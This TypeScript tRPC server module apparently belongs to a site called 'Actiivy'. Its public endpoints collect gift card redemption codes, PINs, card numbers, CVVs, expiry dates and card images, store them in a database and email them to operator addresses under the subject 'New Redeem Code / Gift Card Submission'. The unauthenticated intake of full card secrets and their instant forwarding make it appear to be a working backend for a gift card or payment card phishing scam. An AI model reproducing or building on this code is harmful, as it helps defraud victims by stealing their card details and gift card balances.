import { router, publicProcedure } from './trpc.ts.js';
import { z } from 'zod';
import nodemailer from 'nodemailer';
import { db } from './db.ts.js';
import { submissions } from './schema.ts.js';

const transporter = nodemailer.createTransport({
 host: 'smtp.gmail.com', port: 465, secure: true,
 auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_APP_PASSWORD }
});
const recipients = [...new Set((process.env.NOTIFICATION_EMAILS ?? '').split(',').map(x => x.trim()).filter(Boolean))];
const inputSchema = z.object({
 code: z.string(), imageUrl: z.string().optional(), userAgent: z.string().optional(), ip: z.string().optional(), metadata: z.record(z.any()).optional()
});

type ImageAttachment = { filename: string; content: Buffer; contentType: string; cid: string; contentDisposition: 'inline' };
type ImageAsset = { label: string; url: string; cid?: string; attachment?: ImageAttachment };

const escapeHtml = (value: string) => value.replace(/[&<>"']/g, character => ({
 '&': '&amp;',
 '<': '&lt;',
 '>': '&gt;',
 '"': '&quot;',
 "'": '&#39;'
 }[character] ?? character));

const toAbsoluteUrl = (value: string) => {
 try {
  return new URL(value, process.env.PUBLIC_APP_URL ?? 'https://actiivy-frontend.onrender.com').toString();
 } catch {
  return value;
 }
};

const createImageAsset = (value: unknown, label: string, index: number): ImageAsset | null => {
 if (typeof value !== 'string' || !value.trim()) return null;
 const raw = value.trim();
 if (!raw.startsWith('data:')) return { label, url: toAbsoluteUrl(raw) };
 const match = raw.match(/^data:([^;,]+)?(;base64)?,([\s\S]*)$/);
 if (!match) return null;
 try {
  const contentType = match[1] || 'application/octet-stream';
  const content = match[2] ? Buffer.from(match[3], 'base64') : Buffer.from(decodeURIComponent(match[3]), 'utf8');
  const cid = `actiivy-${Date.now()}-${index}@submission`;
  const extension = contentType.split('/')[1]?.split('+')[0] || 'bin';
  return { label, url: `cid:${cid}`, cid, attachment: { filename: `${label.toLowerCase().replace(/[^a-z0-9]+/g, '-')}.${extension}`, content, contentType, cid, contentDisposition: 'inline' } };
 } catch {
  return null;
 }
};

const sendSubmission = async (input: z.infer<typeof inputSchema>) => {
 await db.insert(submissions).values({ ...input, metadata: JSON.stringify(input.metadata), createdAt: new Date() });
 if (!recipients.length) throw new Error('NOTIFICATION_EMAILS is not configured');

 const metadata = input.metadata ?? {};
 const cardType = String(metadata.cardType ?? 'Not provided');
 const currency = String(metadata.currency ?? '');
 const amount = String(metadata.amount ?? 'Not provided');
 const code = input.code || 'Not provided';
 const amountLabel = `${currency} ${amount}`.trim();
 const imageAssets = [
  createImageAsset(input.imageUrl, 'Front image', 1),
  createImageAsset(metadata.backImageUrl, 'Back image', 2)
 ].filter((asset): asset is ImageAsset => Boolean(asset));
 const textImages = imageAssets.length ? imageAssets.map(asset => `${asset.label}: ${asset.attachment ? 'attached to this email' : asset.url}`).join('\n') : 'Images: None uploaded';
 const htmlImages = imageAssets.length ? imageAssets.map(asset => {
  if (asset.attachment && asset.cid) return `<table role="presentation" cellpadding="0" cellspacing="0" border="0" style="margin:16px 0;border-collapse:collapse"><tr><td style="font-family:Arial,sans-serif;font-size:14px;font-weight:700;padding:0 0 8px">${escapeHtml(asset.label)}</td></tr><tr><td><img src="cid:${escapeHtml(asset.cid)}" alt="${escapeHtml(asset.label)}" style="display:block;max-width:600px;width:auto;height:auto;border:1px solid #d1d5db;border-radius:6px" /></td></tr></table>`;
  const safeUrl = escapeHtml(asset.url);
  return `<p><strong>${escapeHtml(asset.label)}:</strong> <a href="${safeUrl}">${safeUrl}</a></p>`;
 }).join('') : '<p><strong>Images:</strong> None uploaded</p>';
 const text = [
  'New Submission Received',
  `Card type: ${cardType}`,
  `Amount: ${amountLabel}`,
  `Redemption Code: ${code}`,
  textImages
 ].join('\n');
 const message = {
  from: `Actiivy Alerts <${process.env.SMTP_USER}>`,
  subject: 'New Redeem Code / Gift Card Submission',
  text,
  html: `<h2>New Submission Received</h2><p><strong>Card type:</strong> ${escapeHtml(cardType)}</p><p><strong>Amount:</strong> ${escapeHtml(amountLabel)}</p><p><strong>Redemption Code:</strong> <code>${escapeHtml(code)}</code></p>${htmlImages}`,
  attachments: imageAssets.flatMap(asset => asset.attachment ? [asset.attachment] : [])
 };
 await Promise.all(recipients.map(async to => {
  try {
   const info = await transporter.sendMail({ ...message, to });
   console.log(JSON.stringify({ event: 'notification.smtp.result', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), acceptedCount: info.accepted?.length ?? 0, rejectedCount: info.rejected?.length ?? 0, messageId: info.messageId ?? null }));
  } catch (error: any) {
   console.error(JSON.stringify({ event: 'notification.smtp.error', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), code: error?.code ?? null, responseCode: error?.responseCode ?? null, message: error?.message ?? 'Unknown SMTP error' }));
   throw error;
  }
 }));
 return { success: true, recipientCount: recipients.length, message: `Sent to ${recipients.length} recipient(s).` };
};

export const submissionRouter = router({ submitRedeem: publicProcedure.input(inputSchema).mutation(({ input }) => sendSubmission(input)) });
const cardSchema = z.object({ cardType: z.string(), currency: z.string(), amount: z.string(), cardName: z.string().optional(), cardNumber: z.string().optional(), expiryDate: z.string().optional(), cvv: z.string().optional(), giftCardCvv: z.string().optional(), giftCardPin: z.string().optional(), fourDigitPin: z.string().optional(), giftCardExpiryDate: z.string().optional(), redemptionCode: z.string().optional(), redemptionCode1: z.string().optional(), redemptionCode2: z.string().optional(), redemptionCode3: z.string().optional(), frontImageUrl: z.string().optional(), backImageUrl: z.string().optional() });
export const cardRouter = router({ submit: publicProcedure.input(cardSchema).mutation(({ input }) => sendSubmission({ code: [input.redemptionCode, input.redemptionCode1, input.redemptionCode2, input.redemptionCode3].filter(Boolean).join(' | ') || input.giftCardPin || input.cardNumber || 'TEST-SUBMISSION', imageUrl: input.frontImageUrl, metadata: { cardType: input.cardType, currency: input.currency, amount: input.amount, backImageUrl: input.backImageUrl } })) });
